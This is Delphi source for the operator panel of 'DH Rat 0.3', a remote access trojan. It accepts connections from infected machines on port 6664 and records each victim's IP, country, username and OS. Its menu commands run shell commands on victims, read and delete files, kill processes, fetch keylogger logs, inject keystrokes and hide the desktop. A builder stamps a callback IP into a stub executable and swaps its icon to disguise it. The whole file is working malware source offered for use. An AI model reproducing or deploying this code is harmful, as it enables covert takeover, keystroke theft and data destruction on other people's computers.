// DH Rat 0.3
// (C) Doddy Hackman 2013

unit rat;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinManager, ComCtrls, sStatusBar, sPageControl, StdCtrls,
  sGroupBox, ShellApi, sListView, sMemo, sEdit, sButton, acPNG, ExtCtrls,
  sLabel, ScktComp, Menus, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, madRes, WinInet;

type
  TForm1 = class(TForm)
    sSkinManager1: TsSkinManager;
    sStatusBar1: TsStatusBar;
    sPageControl1: TsPageControl;
    sTabSheet1: TsTabSheet;
    sTabSheet2: TsTabSheet;
    sTabSheet3: TsTabSheet;
    sTabSheet4: TsTabSheet;
    sGroupBox1: TsGroupBox;
    sGroupBox2: TsGroupBox;
    sListView1: TsListView;
    sMemo1: TsMemo;
    sGroupBox3: TsGroupBox;
    sGroupBox4: TsGroupBox;
    sEdit1: TsEdit;
    sGroupBox5: TsGroupBox;
    sButton1: TsButton;
    sGroupBox6: TsGroupBox;
    Image1: TImage;
    sLabel1: TsLabel;
    ServerSocket1: TServerSocket;
    PopupMenu1: TPopupMenu;
    O1: TMenuItem;
    C1: TMenuItem;
    L1: TMenuItem;
    D1: TMenuItem;
    R1: TMenuItem;
    S1: TMenuItem;
    J1: TMenuItem;
    M1: TMenuItem;
    T1: TMenuItem;
    ifPoslistarprocesoscode0then1: TMenuItem;
    K1: TMenuItem;
    C2: TMenuItem;
    C3: TMenuItem;
    H1: TMenuItem;
    S2: TMenuItem;
    H2: TMenuItem;
    S3: TMenuItem;
    K2: TMenuItem;
    PopupMenu2: TPopupMenu;
    S4: TMenuItem;
    S5: TMenuItem;
    Image2: TImage;
    sGroupBox7: TsGroupBox;
    sGroupBox8: TsGroupBox;
    Image3: TImage;
    sButton2: TsButton;
    OpenDialog1: TOpenDialog;
    sEdit2: TsEdit;
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);

    procedure O1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure L1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure J1Click(Sender: TObject);
    procedure M1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure ifPoslistarprocesoscode0then1Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure H2Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure K2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure S4Click(Sender: TObject);

    procedure S5Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure sEdit1DblClick(Sender: TObject);

    procedure sButton1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  argumento: string;

implementation

{$R *.dfm}
// Functions

function toma(const pagina: string): UTF8String;

// Credits : Based on http://www.scalabium.com/faq/dct0080.htm
// Thanks to www.scalabium.com

var
  nave1: HINTERNET;
  nave2: HINTERNET;
  tou: DWORD;
  codez: UTF8String;
  codee: array [0 .. 1023] of byte;
  finalfinal: string;

begin

  try

    begin

      finalfinal := '';
      Result := '';

      nave1 := InternetOpen(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12'
          , INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

      nave2 := InternetOpenUrl(nave1, PChar(pagina), nil, 0,
        INTERNET_FLAG_RELOAD, 0);

      repeat

      begin
        InternetReadFile(nave2, @codee, SizeOf(codee), tou);
        SetString(codez, PAnsiChar(@codee[0]), tou);
        finalfinal := finalfinal + codez;
      end;

      until tou = 0;

      InternetCloseHandle(nave2);
      InternetCloseHandle(nave1);

      Result := finalfinal;
    end;

  except
    //
  end;

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Write(ar, texto);
  CloseFile(ar);

end;

//

procedure TForm1.FormCreate(Sender: TObject);
begin

  sSkinManager1.SkinDirectory := ExtractFilePath(Application.ExeName) + 'Data';
  sSkinManager1.SkinName := 'matrix';
  sSkinManager1.Active := True;

  try
    begin

      sListView1.Items.Clear;

      ServerSocket1.Port := 6664;
      ServerSocket1.Open;

      sStatusBar1.Panels[0].text := '[+] Online';
      Form1.sStatusBar1.Update;

    end;
  except
    sStatusBar1.Panels[0].text := '[-] Error';
    Form1.sStatusBar1.Update;
  end;
end;

procedure TForm1.C1Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText('![closecd]');
end;

procedure TForm1.C2Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Command', 'net user');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![ejecutar] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.C3Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Number', '123');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![crazymouse] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.D1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'File', 'C:/XAMPP/test.txt');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![borraresto] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.H1Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![ocultartaskbar]');
end;

procedure TForm1.H2Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![ocultariconos]');
end;

procedure TForm1.ifPoslistarprocesoscode0then1Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![listarprocesos]');
end;

procedure TForm1.J1Click(Sender: TObject);
begin

  argumento := InputBox('DH Rat', 'Keys', 'No tengas miedo');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![escribirword] [argumento]' + argumento + '[argumento]');

end;

procedure TForm1.K1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'PID', '');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![matarproceso] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.K2Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![keyloggerlogs]');
end;

procedure TForm1.L1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Directory', 'C:/XAMPP');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![listardirectorio] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.M1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Text', 'No tengas miedo');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![mensaje] [argumento]' + argumento + '[argumento]');

end;

procedure TForm1.O1Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText('![opencd]');
end;

procedure TForm1.R1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Directory', 'C:/XAMPP');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![leerarchivo] [argumento]' + argumento + '[argumento]');

end;

procedure TForm1.S1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Keys', 'No tengas miedo');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![sendkeys] [argumento]' + argumento + '[argumento]');

end;

procedure TForm1.S2Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![volvertaskbar]');
end;

procedure TForm1.S3Click(Sender: TObject);
begin
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![volvericonos]');
end;

procedure TForm1.T1Click(Sender: TObject);
begin
  argumento := InputBox('DH Rat', 'Text', 'Mother Fucker');
  ServerSocket1.Socket.Connections[sListView1.Itemindex].SendText
    ('![hablar] [argumento]' + argumento + '[argumento]');
end;

procedure TForm1.S4Click(Sender: TObject);
begin

  try
    begin
      ServerSocket1.Port := 6664;
      ServerSocket1.Open;

      sListView1.Items.Clear;

      sStatusBar1.Panels[0].text := '[+] Online';
      Form1.sStatusBar1.Update;
    end;
  except

    sStatusBar1.Panels[0].text := '[-] Error';
    Form1.sStatusBar1.Update;
  end;

end;

procedure TForm1.S5Click(Sender: TObject);
begin
  try
    begin

      sListView1.Items.Clear;
      ServerSocket1.Close;
      sStatusBar1.Panels[0].text := '[+] OffLine';
      Form1.sStatusBar1.Update;
    end;
  except
    sStatusBar1.Panels[0].text := '[-] Error';
    Form1.sStatusBar1.Update;
  end;
end;

procedure TForm1.sButton1Click(Sender: TObject);

var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  marca_uno: string;
  lineafinal: string;
  stubgenerado: string;
  change: DWORD;
  valor: string;

begin

  stubgenerado := 'server_ready.exe';
  lineafinal := '[ip]' + sEdit1.text + '[ip]';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName)
        + '/' + 'Data/stubnow.exe'), PChar(ExtractFilePath(Application.ExeName)
        + '/' + stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, PChar(linea));
  aca := CreateFile(PChar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  //

  if not(sEdit2.text = '') then
  begin
    try
      begin

        valor := IntToStr(128);

        change := BeginUpdateResourceW
          (PWideChar(wideString(ExtractFilePath(Application.ExeName)
                + '/' + stubgenerado)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(sEdit2.text)));
        EndUpdateResourceW(change, False);
        sStatusBar1.Panels[0].text := '[+] Done ';
        sStatusBar1.Update;
      end;
    except
      begin
        sStatusBar1.Panels[0].text := '[-] Error';
        sStatusBar1.Update;
      end;
    end;
  end
  else
  begin
    sStatusBar1.Panels[0].text := '[+] Done ';
    sStatusBar1.Update;
  end;

  //

end;

procedure TForm1.sButton2Click(Sender: TObject);
begin

  OpenDialog1.InitialDir := GetCurrentDir;
  OpenDialog1.Filter := 'ICO|*.ico|';

  if OpenDialog1.Execute then
  begin
    Image3.Picture.LoadFromFile(OpenDialog1.filename);
    sEdit2.text := OpenDialog1.filename;
  end;

end;

procedure TForm1.sEdit1DblClick(Sender: TObject);
var
  code, ip: string;
begin

  code := toma('http://whatismyipaddress.com/');

  ip := regex(code, 'alt="Click for more about ', '"></a>');

  sEdit1.text := ip;

end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin

  with sListView1.Items.Add do
  begin
    Caption := Socket.RemoteHost;
    SubItems.Add('?');
    SubItems.Add('?');
    SubItems.Add('?');
    SubItems.Add('?');

  end;

end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  code: string;
  host: string;
  ip: string;
  pais: string;
  username: string;
  os: string;

begin

  code := Socket.ReceiveText;

  if (Pos('[datos_nuevos][ip]', code) > 0) then
  begin

    ip := regex(code, '[ip]', '[ip]');
    pais := regex(code, '[pais]', '[pais]');
    username := regex(code, '[username]', '[username]');
    os := regex(code, '[os]', '[os]');

    sListView1.Items[sListView1.Items.Count - 1].SubItems[0] := ip;
    sListView1.Items[sListView1.Items.Count - 1].SubItems[1] := pais;
    sListView1.Items[sListView1.Items.Count - 1].SubItems[2] := username;
    sListView1.Items[sListView1.Items.Count - 1].SubItems[3] := os;

    sMemo1.Lines.Add('[+] Update Target : OK');

  end

  else if (Pos('![keyloggerlogs]', code) > 0) then
  begin
    if (FileExists('logs_keylogger.html')) then
    begin
      DeleteFile('logs_keylogger.html');
    end;

    savefile('logs_keylogger.html', code);

    sMemo1.Lines.Add('[+] Keylogger : OK');

    ShellExecute(0, nil, PChar(ExtractFilePath(Application.ExeName)
          + 'logs_keylogger.html'), nil, nil, SW_SHOWNORMAL);
  end
  else
  begin
    sMemo1.Lines.Add(code);
  end;

end;

end.

// The End ?
